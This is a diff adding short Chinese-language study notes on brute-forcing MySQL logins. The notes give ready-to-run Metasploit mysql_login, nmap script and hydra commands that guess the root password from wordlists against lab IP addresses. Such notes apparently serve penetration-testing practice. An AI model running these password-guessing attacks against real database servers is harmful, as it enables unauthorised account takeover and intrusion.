@@ -1,0 +1,71 @@
+# MYSQL爆破
+
+> ​ 学习地址：
+>
+> * [https://xz.aliyun.com/t/1652](https://xz.aliyun.com/t/1652)
+
+## MYSQL 爆破
+
+### 使用 metasploit
+
+启动 metasploit：
+
+```
+$ msfconsole
+```
+
+使用 `auxiliary/scanner/mysql/mysql_login` 模块进行：
+
+可以单一扫描验证登录验证：
+
+```
+use auxiliary/scanner/mysql/mysql_login
+set rhosts <ip-address>
+set username root
+set password 11111111
+run
+```
+
+使用某个字典进行爆破：
+
+```
+use auxiliary/scanner/mysql/mysql_login
+set RHOSTS <ip-address>
+set pass_file “/root/top10000pwd.txt”
+set username root
+run
+```
+
+### nmap 扫描
+
+可以查看所有与 `mysql` 相关的脚本：
+
+```
+$ ls -al /usr/share/nmap/scripts/mysql*
+```
+
+先查看是否开启了端口
+
+```
+$ nmap <ip-address>
+```
+
+扫描空口令：
+
+```
+$ nmap -p3306 --script=mysql-empty-password.nse 192.168.137.130
+```
+
+扫描已知口令：
+
+```
+$ nmap -sV --script=mysql-databases --script-args dbuser=root,dbpass=11111111 192.168.195.130
+```
+
+### xHydra 和 Hydras
+
+使用字典进行爆破：
+
+```
+$ hydra -l root -P /root/Desktop/top10000pwd.txt -t 16 192.168.157.130 mysql
+```
